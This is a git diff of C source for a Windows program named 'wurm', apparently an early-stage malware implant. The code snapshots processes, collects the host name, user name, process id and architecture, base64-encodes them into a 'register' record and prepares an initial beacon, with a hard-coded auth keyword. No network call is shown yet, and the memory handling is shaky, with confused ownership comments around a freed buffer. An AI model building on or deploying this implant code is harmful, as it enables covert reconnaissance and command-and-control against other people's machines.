@@ -18,9 +18,13 @@ struct {
     struct {
         CHAR* status;
         CHAR* format;
+        //CHAR* buffer; // must be freed
+        CHAR* encode; // must be freed
+        //CHAR* length;
+        //DWORD size;
     } data;
     struct {
-        CHAR* name;
+        CHAR*   name; // must be freed
         CHAR    hostname[MAX_PATH];
         CHAR    username[MAX_PATH];
         CHAR    arch[MAX_PATH];
@@ -31,13 +35,18 @@ struct {
 
 void Encode(CHAR* data_to_encode, DWORD data_to_encode_length) {
     DWORD encoded_data_length = strlen(data_to_encode) * 2;
-    CHAR* encoded_data = (CHAR*) malloc(encoded_data_length);
+    wurm.data.encode = (CHAR*) malloc(encoded_data_length);
     
-    CryptBinaryToStringA((BYTE *) data_to_encode, data_to_encode_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded_data, &encoded_data_length);
+    CryptBinaryToStringA((BYTE *) data_to_encode, data_to_encode_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, wurm.data.encode, &encoded_data_length);
 
-    printf("Encoded data: %s\n ", encoded_data);
+    printf("Encoded data: %s\n ", wurm.data.encode);
+}
 
-    free(encoded_data);
+void Package(CHAR* buffer) {
+    printf("%s",buffer);
+
+    // Clean up memory
+    free(buffer);
 }
 
 void Register() {
@@ -61,7 +70,7 @@ void Register() {
     // Structures and handles for tlhelp32
     PROCESSENTRY32 process_info;
     process_info.dwSize = sizeof(PROCESSENTRY32);
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Must be closed
 
     // Set data allocation format
     wurm.data.status = "register";
@@ -111,13 +120,17 @@ void Register() {
 
     // Allocate memory to be encoded
     DWORD pointer_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(wurm.info.hostname) + strlen(wurm.info.username) + 4 + strlen(wurm.info.name) + strlen(wurm.info.arch);
-    CHAR* data_pointer = malloc(pointer_length);
+    CHAR* data_pointer = malloc(pointer_length); // Must be freed
     sprintf_s(data_pointer, pointer_length, wurm.data.format, wurm.data.status, wurm.info.hostname, wurm.info.username, wurm.info.pid, wurm.info.name, wurm.info.arch);
 
     // Base-64 encode the allocated data structure 
     DWORD data_length = strlen(wurm.data.status) + strlen(wurm.info.hostname) + strlen(wurm.info.username) + 4 + strlen(wurm.info.name) + strlen(wurm.info.arch) + 2; // Add two null bytes
     printf("%s\n", data_pointer);
     Encode(data_pointer, data_length);
+
+    // Allocate buffer in data structure
+    CHAR* buffer = wurm.data.encode; // Note: wurm.data.encode does not need to be freed because it is buffer is pointing its allocation from it.
+    Package(buffer);
 
     // Clean up memory and handles
     CloseHandle(snapshot);
@@ -152,5 +165,6 @@ int main(int argc, char* argv[]) {
     wurm.auth.keyword = "licketysplit";
 
     // Attempt initial beacon with registration data
+    // Note: To properly send a beacon, a format and status must be set, data must be encoded and stored, then a buffer must be set along with its size and length 
     Register();
 }
